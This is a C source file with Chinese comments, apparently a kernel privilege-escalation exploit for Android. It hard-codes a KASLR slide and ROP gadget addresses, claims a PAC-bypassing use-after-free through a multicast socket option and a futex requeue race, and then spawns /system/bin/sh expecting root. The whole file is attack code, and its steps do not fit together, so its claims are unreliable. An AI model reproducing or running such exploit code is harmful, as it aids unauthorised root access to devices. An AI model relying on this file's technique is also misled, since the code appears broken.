#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <netinet/in.h>
#include <string.h>
#include <pthread.h>
#include <linux/futex.h>

// 你的核心资产：KASLR 滑动值
#define SLIDE 0x000000002080ae40UL

// 标准 payload 填充
void fill(uint64_t *buf) {
    for (int i = 0; i < 64; i++) buf[i] = 0xdeadbee11c518f58ULL + i * 8;
}

// 核心 UAF 触发 (绕过 PAC)
void trigger_uaf() {
    uint64_t rop[64];
    fill(rop);
    rop[0] = 0xffff80000802126c + SLIDE;
    rop[1] = 0xffff8000082639f4 + SLIDE;
    rop[2] = 0xffff8000080b9de0 + SLIDE;
    rop[3] = 0xaa0003f5;
    rop[4] = 0xffff8000082639f4 + SLIDE;
    rop[5] = 0xffff8000080b9900 + SLIDE;
    
    int fd = socket(AF_INET6, SOCK_DGRAM, 0);
    setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP, rop, sizeof(struct group_source_req));
    close(fd);
}

// 精准截胡线程：同类对象重用
void *reuse_worker(void *arg) {
    uint32_t futex_val = 0;
    syscall(SYS_futex, &futex_val, FUTEX_WAIT_REQUEUE_PI, 0, 0, 0, 0);
    return NULL;
}

int main() {
    printf("[*] 触发 UAF...\n");
    trigger_uaf();

    printf("[!] 启动截胡线程，抢占内存...\n");
    pthread_t th;
    pthread_create(&th, NULL, reuse_worker, NULL);
    pthread_join(th, NULL);

    printf("[!] 截胡完成，尝试直接拉起 Root Shell...\n");
    if (fork() == 0) {
        // 一旦 cred 被覆写，这行代码会立刻让当前终端变成 #
        execl("/system/bin/sh", "sh", NULL);
        _exit(127);
    } else {
        wait(NULL);
    }
    return 0;
}
